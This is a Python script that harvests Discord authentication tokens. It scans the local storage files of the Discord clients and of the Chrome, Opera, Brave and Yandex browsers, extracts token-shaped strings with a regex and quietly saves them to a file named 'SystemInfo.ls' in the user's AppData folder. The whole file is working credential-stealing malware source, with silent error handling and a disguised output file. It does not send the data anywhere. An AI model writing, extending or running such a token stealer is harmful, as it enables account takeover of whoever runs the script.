import os
import re
import sys

def token_ripper(path):
    tokens = []
    path += "\\Local Storage\\leveldb\\"

    try:
        for file in os.listdir(path): 
            if file.endswith('.ldb') or file.endswith('.log'):
                with open(path + file, 'r', encoding='cp437') as f: 
                    content = f.read()
                    token_finder = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", content)  
                    for token in token_finder: 
                        tokens.append(token)  
            else: 
                continue
    except: 
        pass
    return tokens

def ripper():
    machineName = os.environ['COMPUTERNAME']
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    # Collect tokens
    all_tokens = []

    for path in paths:
        if not os.path.exists(paths[path]):
            continue
        
        tokens = token_ripper(paths[path])

        if len(tokens) > 0: 
            all_tokens.extend(tokens)
    
    # Create output message
    output_message = f''
    
    if all_tokens:
        output_message += '' + '\n'.join(all_tokens)
    else:
        output_message += 'No tokens found.'

    # Write to file in AppData directory
    output_file_path = os.path.join(local, 'SystemInfo.ls')
    with open(output_file_path, 'w') as f:
        f.write(output_message)

    # Exit program
    sys.exit()

if __name__ == "__main__":
    ripper()
